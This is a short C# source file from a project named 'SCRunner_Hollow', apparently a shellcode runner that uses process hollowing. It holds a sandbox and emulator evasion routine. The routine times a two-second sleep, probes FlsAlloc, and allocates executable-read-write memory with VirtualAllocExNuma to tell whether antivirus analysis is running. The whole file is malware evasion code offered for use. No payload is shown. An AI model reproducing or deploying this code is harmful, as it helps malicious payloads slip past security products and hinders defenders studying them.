using System;

namespace SCRunner_Hollow
{
    public static class Heuristics
    {
        public static bool EmuCheck()
        {
            DateTime t1 = DateTime.Now;
            Win32API.Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return true;
            }

            uint result = Win32API.FlsAlloc(IntPtr.Zero);
            if (result == 0xFFFFFFFF)
            {
                return true;
            }

            IntPtr address = Win32API.VirtualAllocExNuma(Win32API.GetCurrentProcess(), IntPtr.Zero, 10, Win32API.MEM_COMMIT | Win32API.MEM_RESERVE, Win32API.PAGE_EXECUTE_READWRITE, 0);
            if (address == null)
            {
                return true;
            }

            return false;
        }
    }
}